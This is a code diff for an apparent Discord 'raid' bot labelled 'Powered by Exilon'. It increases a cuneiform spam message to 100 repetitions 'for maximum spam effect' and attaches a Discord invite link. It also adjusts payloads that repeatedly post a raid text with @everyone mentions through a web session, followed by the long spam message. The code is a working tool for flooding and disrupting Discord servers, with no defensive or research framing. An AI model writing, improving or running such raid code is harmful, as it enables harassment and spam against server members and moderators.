@@ -34,10 +34,8 @@ RAID_TEXT = (
     "_Powered by Exilon_"
 )
 
-CUNEIFORM_MSG = (
-    "# 𒅒𒈔𒅒𒇫𒄆" * 20
-    + "\n\n**https://discord.gg/BjtRhW6VHN**"
-)
+# CUNEIFORM – 100 repetitions for maximum spam effect
+CUNEIFORM_MSG = "# " + "𒅒𒈔𒅒𒇫𒄆" * 100 + "\n\n**https://discord.gg/BjtRhW6VHN**"
 
 def blame_message(member: discord.Member) -> str:
     return (
@@ -99,7 +97,7 @@ class RaidView(discord.ui.View):
             for i in range(5):
                 payload = {
                     "content": RAID_TEXT,
-                    "allowed_mentions": {"parse": ["everyone"]}   # REMOVED "here"
+                    "allowed_mentions": {"parse": ["everyone"]}
                 }
                 try:
                     async with session.post(
@@ -119,9 +117,10 @@ class RaidView(discord.ui.View):
                     return
                 await asyncio.sleep(0.5)
 
+            # Send the long cuneiform spam
             payload = {
                 "content": CUNEIFORM_MSG,
-                "allowed_mentions": {"parse": ["everyone"]}   # REMOVED "here"
+                "allowed_mentions": {"parse": ["everyone"]}
             }
             try:
                 async with session.post(
